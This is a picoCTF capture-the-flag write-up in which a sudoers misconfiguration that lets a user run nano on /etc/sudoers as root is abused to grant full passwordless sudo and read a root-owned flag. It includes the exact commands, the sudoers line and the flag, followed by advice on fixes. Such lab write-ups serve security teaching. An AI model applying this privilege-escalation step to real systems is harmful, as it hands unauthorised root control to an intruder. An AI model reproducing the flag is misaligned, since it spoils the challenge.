
**Category:** Privilege Escalation / Linux Permissions
**Flag:** `picoCTF{n4n0_411_7h3_w4y_d74f446b}`

---

## Overview

This challenge involves a **sudoers misconfiguration** on a Linux system. The user `ctf-player` has been granted permission to edit `/etc/sudoers` using `nano` as root — which is essentially handing over the keys to the entire system.

---

## Step-by-Step Solution

### Step 1 — SSH into the machine
```bash
ssh -p 60230 ctf-player@crystal-peak.picoctf.net
```

### Step 2 — Check what's in the home directory
```bash
ls
# flag.txt
```
The flag is right there, but:
```bash
cat flag.txt
# cat: flag.txt: Permission denied
```
It's owned by root and we can't read it directly.

### Step 3 — Try the obvious (fails)
```bash
chmod +x flag.txt
# chmod: changing permissions of 'flag.txt': Operation not permitted
```
We don't own the file, so `chmod` won't work.

### Step 4 — Check sudo permissions
```bash
sudo -l
```
Output:
```
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```
We can edit `/etc/sudoers` as root without a password — this is the vulnerability.

### Step 5 — Edit sudoers to grant ourselves full root access
```bash
sudo /bin/nano /etc/sudoers
```
Scroll to the bottom and add:
```
ctf-player ALL=(ALL) NOPASSWD: ALL
```
Save with `Ctrl+X` → `Y` → `Enter`

### Step 6 — Read the flag
```bash
sudo cat flag.txt
# picoCTF{n4n0_411_7h3_w4y_d74f446b}
```

---

## Summary Table

| Step | Command | Result |
|------|---------|--------|
| List files | `ls` | Found `flag.txt` |
| Read flag | `cat flag.txt` | ❌ Permission denied |
| Change perms | `chmod +x flag.txt` | ❌ Not permitted |
| Check sudo | `sudo -l` | ✅ Can edit `/etc/sudoers` |
| Edit sudoers | `sudo /bin/nano /etc/sudoers` | ✅ Added full sudo rights |
| Get flag | `sudo cat flag.txt` | ✅ Flag! |

---

## Key Takeaway

> Giving a low-privilege user the ability to edit `/etc/sudoers` is equivalent to giving them **full root access**. Once you can write to sudoers, you can grant yourself any permission you want — the security boundary is completely broken.

## Real-World Risk & Fix

| Issue | Fix |
|-------|-----|
| User can edit sudoers | Never grant this permission |
| No password required | Always require password for sensitive sudo commands |
| Overly broad sudo rules | Grant only the minimum necessary commands |

**Flag:** `picoCTF{n4n0_411_7h3_w4y_d74f446b}` 🎉
